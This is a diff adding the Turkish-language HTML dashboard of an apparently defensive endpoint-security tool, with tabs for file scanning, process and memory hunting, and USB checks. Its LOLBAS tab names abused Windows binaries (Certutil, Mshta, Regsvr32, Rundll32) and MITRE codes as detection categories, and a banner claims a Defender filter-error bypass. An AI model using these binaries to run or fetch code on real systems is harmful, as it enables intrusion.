@@ -1,0 +1,2890 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Project Guard :: Siber Guvenlik Kontrol Merkezi</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Outfit:wght@500;600;700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/x-icon" href="/favicon.ico">
+    <style>
+        :root {
+            --bg: #0b0f19;
+            --surface: #111827;
+            --surface-card: rgba(17, 24, 39, 0.75);
+            --surface-hover: rgba(31, 41, 55, 0.6);
+            --border: rgba(255, 255, 255, 0.08);
+            --border-hover: rgba(6, 182, 212, 0.4);
+            --cyan: #06b6d4;
+            --cyan-glow: rgba(6, 182, 212, 0.25);
+            --emerald: #10b981;
+            --amber: #f59e0b;
+            --rose: #f43f5e;
+            --purple: #a855f7;
+            --text: #f3f4f6;
+            --text-muted: #9ca3af;
+            --sidebar-w: 260px;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            display: flex;
+            min-height: 100vh;
+            overflow-x: hidden;
+            background-image: 
+                radial-gradient(at 10% 10%, rgba(6, 182, 212, 0.12) 0px, transparent 50%),
+                radial-gradient(at 90% 90%, rgba(244, 63, 94, 0.08) 0px, transparent 50%);
+        }
+
+        /* Sidebar */
+        aside {
+            width: var(--sidebar-w);
+            background: rgba(15, 23, 42, 0.85);
+            backdrop-filter: blur(20px);
+            border-right: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            padding: 20px 14px;
+            position: fixed;
+            height: 100vh;
+            z-index: 100;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 0 6px 18px;
+            border-bottom: 1px solid var(--border);
+            margin-bottom: 16px;
+        }
+
+        .brand-icon {
+            width: 38px;
+            height: 38px;
+            border-radius: 10px;
+            background: linear-gradient(135deg, var(--cyan), #3b82f6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 19px;
+            box-shadow: 0 0 15px var(--cyan-glow);
+        }
+
+        .brand-title {
+            font-family: 'Outfit', sans-serif;
+            font-size: 18px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            color: #fff;
+        }
+
+        .brand-subtitle {
+            font-size: 10.5px;
+            color: var(--cyan);
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .nav-menu {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            flex: 1;
+            overflow-y: auto;
+            padding-right: 4px;
+        }
+
+        .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 11px;
+            padding: 9px 12px;
+            border-radius: 9px;
+            color: var(--text-muted);
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-size: 13px;
+            font-weight: 500;
+            border: 1px solid transparent;
+        }
+
+        .nav-item:hover {
+            background: var(--surface-hover);
+            color: #fff;
+        }
+
+        .nav-item.active {
+            background: rgba(6, 182, 212, 0.12);
+            color: var(--cyan);
+            border-color: rgba(6, 182, 212, 0.3);
+        }
+
+        .nav-icon { font-size: 16px; width: 18px; text-align: center; }
+
+        .system-badge {
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            border-radius: 8px;
+            padding: 9px 11px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 11.5px;
+            color: var(--emerald);
+            font-weight: 600;
+            margin-top: 8px;
+        }
+
+        .pulse-dot {
+            width: 7px;
+            height: 7px;
+            background: var(--emerald);
+            border-radius: 50%;
+            box-shadow: 0 0 8px var(--emerald);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(0.95); opacity: 0.8; }
+            50% { transform: scale(1.3); opacity: 1; }
+            100% { transform: scale(0.95); opacity: 0.8; }
+        }
+
+        /* Main Content */
+        main {
+            margin-left: var(--sidebar-w);
+            flex: 1;
+            padding: 28px 36px;
+            max-width: 1400px;
+        }
+
+        .tab-content { display: none; }
+        .tab-content.active { display: block; animation: fadeIn 0.3s ease; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(6px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .page-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+
+        .page-title {
+            font-family: 'Outfit', sans-serif;
+            font-size: 25px;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: -0.5px;
+        }
+
+        .page-desc {
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-top: 4px;
+        }
+
+        /* Cards & Grids */
+        .grid-4 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
+            gap: 18px;
+            margin-bottom: 24px;
+        }
+
+        .grid-3 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 18px;
+            margin-bottom: 24px;
+        }
+
+        .card {
+            background: var(--surface-card);
+            backdrop-filter: blur(16px);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 20px;
+            transition: all 0.25s ease;
+        }
+
+        .card:hover {
+            border-color: var(--border-hover);
+            transform: translateY(-2px);
+        }
+
+        .stat-label {
+            font-size: 11.5px;
+            text-transform: uppercase;
+            color: var(--text-muted);
+            letter-spacing: 0.8px;
+            font-weight: 600;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .stat-val {
+            font-family: 'Outfit', sans-serif;
+            font-size: 30px;
+            font-weight: 700;
+            color: #fff;
+            margin-top: 8px;
+        }
+
+        .stat-desc {
+            font-size: 11.5px;
+            color: var(--text-muted);
+            margin-top: 5px;
+        }
+
+        /* Engine Cards */
+        .engine-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(290px, 1fr));
+            gap: 14px;
+            margin-bottom: 24px;
+        }
+
+        .engine-card {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 15px 18px;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .engine-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .engine-name {
+            font-weight: 600;
+            font-size: 14px;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .badge-status {
+            padding: 3px 8px;
+            border-radius: 999px;
+            font-size: 10.5px;
+            font-weight: 600;
+            background: rgba(16, 185, 129, 0.15);
+            color: var(--emerald);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+        }
+
+        .engine-desc {
+            font-size: 11.5px;
+            color: var(--text-muted);
+            line-height: 1.45;
+        }
+
+        /* Form elements */
+        .form-row {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 18px;
+        }
+
+        input[type="text"] {
+            flex: 1;
+            background: rgba(15, 23, 42, 0.8);
+            border: 1px solid var(--border);
+            border-radius: 9px;
+            padding: 11px 16px;
+            color: #fff;
+            font-size: 13.5px;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        input[type="text"]:focus {
+            border-color: var(--cyan);
+            box-shadow: 0 0 12px var(--cyan-glow);
+        }
+
+        .btn {
+            background: linear-gradient(135deg, var(--cyan), #2563eb);
+            color: #fff;
+            border: none;
+            border-radius: 9px;
+            padding: 11px 22px;
+            font-size: 13.5px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 14px var(--cyan-glow);
+        }
+
+        .btn:hover {
+            opacity: 0.95;
+            transform: translateY(-1px);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.08);
+            color: #fff;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 7px 14px;
+            font-size: 12.5px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .btn-secondary:hover { background: rgba(255, 255, 255, 0.15); }
+
+        .btn-danger {
+            background: rgba(244, 63, 94, 0.2);
+            color: var(--rose);
+            border: 1px solid rgba(244, 63, 94, 0.4);
+            border-radius: 7px;
+            padding: 5px 11px;
+            font-size: 11.5px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .btn-danger:hover { background: rgba(244, 63, 94, 0.35); }
+
+        .btn-restore {
+            background: rgba(16, 185, 129, 0.2);
+            color: var(--emerald);
+            border: 1px solid rgba(16, 185, 129, 0.4);
+            border-radius: 7px;
+            padding: 5px 11px;
+            font-size: 11.5px;
+            cursor: pointer;
+        }
+
+        .btn-restore:hover { background: rgba(16, 185, 129, 0.3); }
+
+        .checkbox-label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 12.5px;
+            color: var(--text-muted);
+            cursor: pointer;
+        }
+
+        /* Table */
+        .table-wrap {
+            background: var(--surface-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+            backdrop-filter: blur(16px);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            text-align: left;
+            font-size: 12.5px;
+        }
+
+        th {
+            background: rgba(15, 23, 42, 0.9);
+            padding: 12px 16px;
+            color: var(--text-muted);
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 10.5px;
+            letter-spacing: 0.8px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        td {
+            padding: 12px 16px;
+            border-bottom: 1px solid var(--border);
+            color: #e2e8f0;
+        }
+
+        tr:hover td { background: rgba(255, 255, 255, 0.02); }
+
+        .pill {
+            display: inline-block;
+            padding: 2px 7px;
+            border-radius: 999px;
+            font-size: 10.5px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .pill-critical { background: rgba(244, 63, 94, 0.15); color: var(--rose); border: 1px solid var(--rose); }
+        .pill-high { background: rgba(245, 158, 11, 0.15); color: var(--amber); border: 1px solid var(--amber); }
+        .pill-clean { background: rgba(16, 185, 129, 0.15); color: var(--emerald); border: 1px solid var(--emerald); }
+        .pill-purple { background: rgba(168, 85, 247, 0.15); color: var(--purple); border: 1px solid var(--purple); }
+
+        /* Toast */
+        #toast {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            padding: 14px 22px;
+            background: #1e293b;
+            color: #fff;
+            border-radius: 10px;
+            border: 1px solid var(--cyan);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
+            display: none;
+            z-index: 1000;
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Sidebar -->
+    <aside>
+        <div class="brand">
+            <div class="brand-icon"><img src="/favicon.ico" style="width:26px; height:26px; border-radius:6px;" alt="Shield"></div>
+            <div>
+                <div class="brand-title">Project Guard</div>
+                <div class="brand-subtitle">Tehdit Kontrol Paneli</div>
+            </div>
+        </div>
+
+        <div class="nav-menu">
+            <div class="nav-item active" onclick="switchTab('tab-overview')">
+                <span class="nav-icon">&#128202;</span> Genel Bakis
+            </div>
+            <div class="nav-item" onclick="switchTab('tab-scanner')">
+                <span class="nav-icon">&#128269;</span> Dosya Tarama
+            </div>
+            <div class="nav-item" onclick="switchTab('tab-processes')">
+                <span class="nav-icon">&#9889;</span> Surec Avcisi
+            </div>
+            <div class="nav-item" onclick="switchTab('tab-memory')">
+                <span class="nav-icon">&#129504;</span> Bellek & Enjeksiyon
+            </div>
+            <div class="nav-item" onclick="switchTab('tab-lolbas')">
+                <span class="nav-icon">&#128737;</span> LOLBAS & Anomali
+            </div>
+            <div class="nav-item" onclick="switchTab('tab-usb')">
+                <span class="nav-icon">&#128190;</span> USB & Surucu
+            </div>
+            <div class="nav-item" onclick="switchTab('tab-persistence')">
+                <span class="nav-icon">&#9881;</span> Kalicilik (Autoruns)
+            </div>
+            <div class="nav-item" onclick="switchTab('tab-canary')">
+                <span class="nav-icon">&#128038;</span> Fidye Kapani (Canary)
+            </div>
+            <div class="nav-item" onclick="switchTab('tab-network')">
+                <span class="nav-icon">&#128376;</span> Ag & C2 Avcisi
+            </div>
+            <div class="nav-item" onclick="switchTab('tab-quarantine')">
+                <span class="nav-icon">&#128230;</span> Karantina Kasasi
+            </div>
+            <div class="nav-item" onclick="switchTab('tab-feeds')">
+                <span class="nav-icon">&#127760;</span> Tehdit Istihbarati
+            </div>
+            <div class="nav-item" onclick="switchTab('tab-drivers')">
+                <span class="nav-icon">&#128680;</span> Sürücü Avcısı (BYOVD)
+            </div>
+            <div class="nav-item" onclick="switchTab('tab-fim')">
+                <span class="nav-icon">&#128274;</span> FIM Sistem Bütünlüğü
+            </div>
+            <div class="nav-item" onclick="switchTab('tab-scripts')">
+                <span class="nav-icon">&#128220;</span> Komut & AMSI Avcısı
+            </div>
+            <div class="nav-item" onclick="switchTab('tab-iocs')">
+                <span class="nav-icon">&#128065;</span> Statik IOC Triyajı
+            </div>
+            <div class="nav-item" onclick="switchTab('tab-eventlog')">
+                <span class="nav-icon">&#128450;</span> Olay Günlüğü (EventLog)
+            </div>
+            <div class="nav-item" onclick="switchTab('tab-triage')">
+                <span class="nav-icon">&#128300;</span> Derin PE Triyajı & Entropi
+            </div>
+        </div>
+
+        <div class="system-badge" id="sidebar-defender-badge" onclick="switchTab('tab-overview')" style="cursor:pointer;" title="Windows Defender Eşzamanlı Çalışma Detayları">
+            <div class="pulse-dot"></div>
+            <span id="sidebar-defender-text">Defender: Dual-Layer OK</span>
+        </div>
+
+        <!-- FatRab App Recommendation (Subtle & Non-Intrusive) -->
+        <div style="margin-top: 12px; padding: 8px 10px; background: rgba(52, 168, 83, 0.07); border: 1px solid rgba(52, 168, 83, 0.22); border-radius: 8px; transition: all 0.2s ease;">
+            <a href="https://play.google.com/store/apps/details?id=com.fatrab.budget" target="_blank" rel="noopener noreferrer" style="text-decoration: none; display: flex; align-items: center; gap: 8px;">
+                <img src="/assets/fatrab-icon.png" alt="FatRab" style="width: 26px; height: 26px; border-radius: 6px; flex-shrink: 0;" onerror="this.src='play-icon-512.png'" />
+                <div style="text-align: left; line-height: 1.25; min-width: 0;">
+                    <div style="font-size: 11px; font-weight: 600; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">FatRab Bütçe Takipçisi</div>
+                    <div style="font-size: 10px; color: #34A853; font-weight: 500;">Google Play'de İndir ↗</div>
+                </div>
+            </a>
+        </div>
+    </aside>
+
+    <!-- Main Content Area -->
+    <main>
+
+        <!-- TAB 1: OVERVIEW -->
+        <div id="tab-overview" class="tab-content active">
+            <div class="page-header">
+                <div>
+                    <h1 class="page-title">Sistem Guvenlik Durumu</h1>
+                    <p class="page-desc">14 adet coklu motor, LOLBAS avcisi ve acik kaynak istihbarat akisinin canli saglik tablosu.</p>
+                </div>
+                <button class="btn" onclick="triggerUpdate()">
+                    <span>&#8635;</span> Imzalari Guncelle
+                </button>
+            </div>
+
+            <div class="grid-4" style="margin-bottom: 20px;">
+                <div class="card">
+                    <div class="stat-label">Kayitli Tehdit Imzasi <span>&#128225;</span></div>
+                    <div class="stat-val" id="stat-total-sigs">-</div>
+                    <div class="stat-desc">MalwareBazaar, ThreatFox & ClamAV</div>
+                </div>
+                <div class="card">
+                    <div class="stat-label">Botnet C2 IP Blok Listesi <span>&#127760;</span></div>
+                    <div class="stat-val" id="stat-c2-count" style="color: var(--cyan);">-</div>
+                    <div class="stat-desc">Feodo Tracker aktif C2 ipleri</div>
+                </div>
+                <div class="card">
+                    <div class="stat-label">Karantina Kasasi <span>&#128230;</span></div>
+                    <div class="stat-val" id="stat-quar-count" style="color: var(--amber);">-</div>
+                    <div class="stat-desc">XOR 0x5A sifrelemeli kasa</div>
+                </div>
+                <div class="card">
+                    <div class="stat-label">Windows Defender Durumu <span>&#128737;</span></div>
+                    <div class="stat-val" id="stat-defender-val" style="color: var(--emerald);">Aktif & Uyumlu</div>
+                    <div class="stat-desc" id="stat-defender-desc">Real-Time Protection devrede</div>
+                </div>
+            </div>
+
+            <!-- Windows Defender Coexistence Banner -->
+            <div class="card" style="margin-bottom: 24px; border: 1px solid rgba(16, 185, 129, 0.3); background: rgba(16, 185, 129, 0.06);">
+                <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px;">
+                    <div style="display: flex; align-items: center; gap: 14px;">
+                        <div style="font-size: 28px; width: 44px; height: 44px; border-radius: 10px; background: rgba(16, 185, 129, 0.15); display: flex; align-items: center; justify-content: center;">
+                            &#128737;
+                        </div>
+                        <div>
+                            <div style="font-size: 15px; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px;">
+                                Windows Defender Eşzamanlı Çift Katmanlı Koruma (Dual-Layer Shield)
+                                <span class="pill pill-clean" id="banner-defender-pill">Aktif</span>
+                            </div>
+                            <div style="font-size: 12px; color: var(--text-muted); margin-top: 3px;" id="banner-defender-details">
+                                MpCmdRun yerel tarayıcısı entegre. WdFilter Hata 225 atlama devrede. Karantina dosyaları XOR 0x5A ile korunuyor.
+                            </div>
+                        </div>
+                    </div>
+                    <div style="display: flex; gap: 10px; align-items: center;">
+                        <div style="text-align: right;">
+                            <div style="font-size: 11px; color: var(--text-muted);">İmza Güncelliği</div>
+                            <div style="font-size: 13px; font-weight: 600; color: var(--emerald);" id="banner-defender-age">0 gün önce</div>
+                        </div>
+                        <button class="btn-secondary" style="padding: 6px 14px; font-size: 12px; border-radius: 7px; cursor: pointer;" onclick="loadDefenderInfo(true)">
+                            Telemetriyi Yenile
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Windows Service Status & Control Card -->
+            <div class="card" style="margin-bottom: 24px; border: 1px solid rgba(6, 182, 212, 0.3); background: rgba(6, 182, 212, 0.05);">
+                <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px;">
+                    <div style="display: flex; align-items: center; gap: 14px;">
+                        <div style="font-size: 26px; width: 44px; height: 44px; border-radius: 10px; background: rgba(6, 182, 212, 0.15); display: flex; align-items: center; justify-content: center;">
+                            &#9881;
+                        </div>
+                        <div>
+                            <div style="font-size: 15px; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px;">
+                                Project Guard Windows Hizmeti (24/7 EDR Servisi)
+                                <span class="pill pill-clean" id="svc-status-pill" style="background: rgba(6,182,212,0.2); color: var(--cyan);">Sorgulanıyor...</span>
+                            </div>
+                            <div style="font-size: 12px; color: var(--text-muted); margin-top: 3px;" id="svc-status-desc">
+                                Windows SCM Servis Adı: <strong>ProjectGuard</strong> | 7/24 Gerçek Zamanlı Koruma (RTP) ve Fidye Kapanı devrede.
+                            </div>
+                        </div>
+                    </div>
+                    <div style="display: flex; gap: 8px; align-items: center; flex-wrap: wrap;">
+                        <button class="btn" style="padding: 6px 14px; font-size: 12px; background: linear-gradient(135deg, var(--emerald), #059669);" onclick="startWindowsService()" id="btn-svc-start">
+                            <span>&#9654;</span> Hizmeti Başlat
+                        </button>
+                        <button class="btn-danger" style="padding: 6px 14px; font-size: 12px;" onclick="stopWindowsService()" id="btn-svc-stop">
+                            <span>&#9632;</span> Durdur
+                        </button>
+                        <button class="btn-secondary" style="padding: 6px 12px; font-size: 12px;" onclick="loadServiceStatus(true)">
+                            <span>&#8635;</span> Yenile
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <h2 style="font-size: 17px; margin-bottom: 15px; color: #fff;">Aktif Tarama ve Tehdit Avlama Motorlari (14 Motor)</h2>
+            <div class="engine-grid" id="engine-container">
+                <!-- Javascript ile doldurulur -->
+            </div>
+
+            <!-- Geliştiriciden Tavsiye / Ekosistem Kartı (Zarif ve Abartısız) -->
+            <div class="card" style="margin-top: 24px; border: 1px solid rgba(52, 168, 83, 0.25); background: linear-gradient(135deg, rgba(52, 168, 83, 0.04), rgba(6, 182, 212, 0.02));">
+                <div style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 16px;">
+                    <div style="display: flex; align-items: center; gap: 14px;">
+                        <img src="/assets/fatrab-icon.png" alt="FatRab Logo" style="width: 44px; height: 44px; border-radius: 11px; box-shadow: 0 4px 12px rgba(52, 168, 83, 0.2); object-fit: cover;" onerror="this.src='play-icon-512.png'" />
+                        <div>
+                            <div style="display: flex; align-items: center; gap: 8px;">
+                                <span style="font-size: 14px; font-weight: 700; color: #fff;">FatRab Bütçe Takipçisi</span>
+                                <span style="font-size: 10px; background: rgba(52, 168, 83, 0.15); color: #34A853; padding: 2px 7px; border-radius: 6px; font-weight: 600;">Google Play</span>
+                                <span style="font-size: 10px; color: var(--text-muted);">Geliştiriciden Tavsiye</span>
+                            </div>
+                            <div style="font-size: 12px; color: var(--text-muted); margin-top: 4px;">
+                                Gelir, gider ve birikimlerinizi kolayca yönetin. Sade arayüzü ve akıllı analizleriyle kişisel bütçe asistanınız.
+                            </div>
+                        </div>
+                    </div>
+                    <a href="https://play.google.com/store/apps/details?id=com.fatrab.budget" target="_blank" rel="noopener noreferrer" class="btn" style="background: linear-gradient(135deg, #34A853, #1e7e34); padding: 7px 16px; font-size: 12px; text-decoration: none; display: inline-flex; align-items: center; gap: 6px;">
+                        <span>&#128241;</span> Google Play'de İncele ↗
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 2: SCANNER -->
+        <div id="tab-scanner" class="tab-content">
+            <div class="page-header">
+                <div>
+                    <h1 class="page-title">Coklu Motor Tarama Merkezi</h1>
+                    <p class="page-desc">Hedef dosya veya klasoru YARA-X, Heuristic PE ve Defender motorlari ile es zamanli tarayin.</p>
+                </div>
+            </div>
+
+            <div class="card" style="margin-bottom: 24px;">
+                <div class="form-row">
+                    <input type="text" id="scan-path" placeholder="Taranacak dosya veya dizin yolu (Orn: .\test_samples veya C:\Users\...)">
+                    <button class="btn" id="scan-btn" onclick="startScan()">
+                        <span>&#128269;</span> Taramayi Baslat
+                    </button>
+                </div>
+                <div style="display: flex; gap: 20px; align-items: center; flex-wrap: wrap;">
+                    <label class="checkbox-label">
+                        <input type="checkbox" id="scan-quar" checked> Tespit edilen zararlilari otomatik karantinaya al
+                    </label>
+                    <label class="checkbox-label">
+                        <input type="checkbox" id="scan-recursive" checked> Alt dizinleri yinelemeli tara
+                    </label>
+                    <button class="btn-secondary" style="padding: 4px 12px; font-size: 12px; border-radius: 6px; cursor: pointer;" onclick="document.getElementById('scan-path').value='.\\test_samples'">
+                        Ornek Klasoru Sec (test_samples)
+                    </button>
+                </div>
+            </div>
+
+            <div id="scan-results-box" style="display: none;">
+                <h3 style="font-size: 16px; margin-bottom: 12px; color: #fff;">Tarama Sonuclari</h3>
+                <div class="grid-4" style="margin-bottom: 20px;">
+                    <div class="card" style="padding: 16px;">
+                        <div class="stat-label">Taranan Dosya</div>
+                        <div class="stat-val" id="res-scanned">-</div>
+                    </div>
+                    <div class="card" style="padding: 16px;">
+                        <div class="stat-label">Bulunan Tehdit</div>
+                        <div class="stat-val" id="res-infected" style="color: var(--rose);">-</div>
+                    </div>
+                    <div class="card" style="padding: 16px;">
+                        <div class="stat-label">Veri Hacmi</div>
+                        <div class="stat-val" id="res-bytes">-</div>
+                    </div>
+                    <div class="card" style="padding: 16px;">
+                        <div class="stat-label">Gecen Sure</div>
+                        <div class="stat-val" id="res-time">-</div>
+                    </div>
+                </div>
+
+                <div class="table-wrap">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Dosya</th>
+                                <th>Tehdit Sinifi</th>
+                                <th>Tespit Eden Motor</th>
+                                <th>Seviye</th>
+                                <th>Detay / Kural</th>
+                                <th>Durum</th>
+                            </tr>
+                        </thead>
+                        <tbody id="scan-table-body">
+                            <!-- JS ile doldurulur -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 3: PROCESSES -->
+        <div id="tab-processes" class="tab-content">
+            <div class="page-header">
+                <div>
+                    <h1 class="page-title">Canli Surec ve Davranissal Avci</h1>
+                    <p class="page-desc">Aktif calisan sureclerin komut satirlari, Sigma kurallari ve tek tikla zararlilari sonlandirma (Kill Switch).</p>
+                </div>
+                <button class="btn" onclick="loadProcesses()">
+                    <span>&#9889;</span> Surecleri Tara
+                </button>
+            </div>
+
+            <div class="table-wrap">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>PID</th>
+                            <th>Surec Adi</th>
+                            <th>Calistirilabilir Yol</th>
+                            <th>Komut Satiri</th>
+                            <th>Tehdit Tespiti</th>
+                            <th>Eylemler</th>
+                        </tr>
+                    </thead>
+                    <tbody id="proc-table-body">
+                        <tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 30px;">
+                            Surecleri denetlemek icin "Surecleri Tara" butonuna basiniz.
+                        </td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- TAB 4: MEMORY HUNTER -->
+        <div id="tab-memory" class="tab-content">
+            <div class="page-header">
+                <div>
+                    <h1 class="page-title">Canli Bellek & Surec Enjeksiyon Avcisi (In-Memory)</h1>
+                    <p class="page-desc">Unbacked RWX bellek bolgeleri, Process Hollowing, Reflective DLL ve Cobalt Strike bellek taramasi.</p>
+                </div>
+                <button class="btn" onclick="loadMemory()">
+                    <span>&#129504;</span> Bellek Taramasini Baslat
+                </button>
+            </div>
+
+            <div class="grid-3">
+                <div class="card">
+                    <div class="stat-label">Denetlenen Bellek</div>
+                    <div class="stat-val" id="mem-scanned-count">-</div>
+                    <div class="stat-desc">VirtualQueryEx bellek sayfalari</div>
+                </div>
+                <div class="card">
+                    <div class="stat-label">Enjekte RWX Bolgeleri</div>
+                    <div class="stat-val" id="mem-threat-count" style="color: var(--rose);">-</div>
+                    <div class="stat-desc">PAGE_EXECUTE_READWRITE tespitleri</div>
+                </div>
+                <div class="card">
+                    <div class="stat-label">Bellek Kalkan Durumu</div>
+                    <div class="stat-val" id="mem-status-badge" style="color: var(--emerald);">Gozetimde</div>
+                    <div class="stat-desc">YARA-X bellek deseni eslesmesi</div>
+                </div>
+            </div>
+
+            <div class="table-wrap">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Surec Adi</th>
+                            <th>PID</th>
+                            <th>Bellek Adresi</th>
+                            <th>Boyut</th>
+                            <th>Bellek Korumasi</th>
+                            <th>Tehdit Sinifi</th>
+                            <th>Detay & YARA</th>
+                            <th>Eylem</th>
+                        </tr>
+                    </thead>
+                    <tbody id="mem-table-body">
+                        <tr><td colspan="8" style="text-align: center; color: var(--text-muted); padding: 30px;">
+                            Bellek bolgelerini denetlemek icin "Bellek Taramasini Baslat" butonuna basiniz.
+                        </td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- TAB LOLBAS & ANOMALY HUNTER -->
+        <div id="tab-lolbas" class="tab-content">
+            <div class="page-header">
+                <div>
+                    <h1 class="page-title">LOLBAS & Ebeveyn-Çocuk Süreç Anomali Avcısı</h1>
+                    <p class="page-desc">Microsoft imzalı meşru ikililerin (Living Off The Land Binaries) kötüye kullanımı, ofis makro kabuk tetiklemeleri ve şüpheli komut parametreleri.</p>
+                </div>
+                <button class="btn" id="btn-lolbas-scan" onclick="loadLolbas()">
+                    <span>&#128737;</span> LOLBAS Taraması Başlat
+                </button>
+            </div>
+
+            <div class="grid-3" style="margin-bottom: 24px;">
+                <div class="card">
+                    <div class="stat-label">LOLBAS Tehdit Sayısı</div>
+                    <div class="stat-val" id="lolbas-threat-count" style="color: var(--rose);">-</div>
+                    <div class="stat-desc">Certutil, Mshta, Regsvr32, Rundll32 vb.</div>
+                </div>
+                <div class="card">
+                    <div class="stat-label">Ofis / Makro Kabuk Tetikleme</div>
+                    <div class="stat-val" id="lolbas-macro-count" style="color: var(--amber);">-</div>
+                    <div class="stat-desc">Word / Excel -> CMD / PowerShell</div>
+                </div>
+                <div class="card">
+                    <div class="stat-label">Tehdit Seviyesi</div>
+                    <div class="stat-val" id="lolbas-status-badge" style="color: var(--emerald);">Temiz</div>
+                    <div class="stat-desc">MITRE ATT&CK T1218, T1059, T1105</div>
+                </div>
+            </div>
+
+            <div class="table-wrap">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Süreç Adı</th>
+                            <th>PID</th>
+                            <th>Ebeveyn Süreç</th>
+                            <th>Kategori & Tehdit</th>
+                            <th>MITRE Kodu</th>
+                            <th>Risk</th>
+                            <th>Komut Satırı & Detay</th>
+                            <th>Eylem</th>
+                        </tr>
+                    </thead>
+                    <tbody id="lolbas-table-body">
+                        <tr><td colspan="8" style="text-align: center; color: var(--text-muted); padding: 30px;">
+                            Süreçleri ve LOLBAS anomalilerini denetlemek için "LOLBAS Taraması Başlat" butonuna basınız.
+                        </td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- TAB 5: USB & REMOVABLE GUARD -->
+        <div id="tab-usb" class="tab-content">
+            <div class="page-header">
+                <div>
+                    <h1 class="page-title">USB & Cikarilabilir Surucu Koruma Kalkani</h1>
+                    <p class="page-desc">Flash bellekler, harici diskler, autorun.inf solucanlari ve sahte LNK kisayol saldirilarina karsi aktif koruma.</p>
+                </div>
+                <button class="btn" onclick="loadUsb()">
+                    <span>&#128190;</span> Takili USB'leri Algila & Tara
+                </button>
+            </div>
+
+            <div class="card" style="margin-bottom: 24px;">
+                <h3 style="font-size: 14.5px; margin-bottom: 10px; color: #fff;">Ozel Surucu veya Klasor Tara</h3>
+                <div class="form-row">
+                    <input type="text" id="usb-custom-path" placeholder="Surucu harfi veya dizin (Orn: E:\ veya D:\Backup)">
+                    <button class="btn" onclick="scanCustomUsb()">
+                        <span>&#128269;</span> Surucuyu Tara
+                    </button>
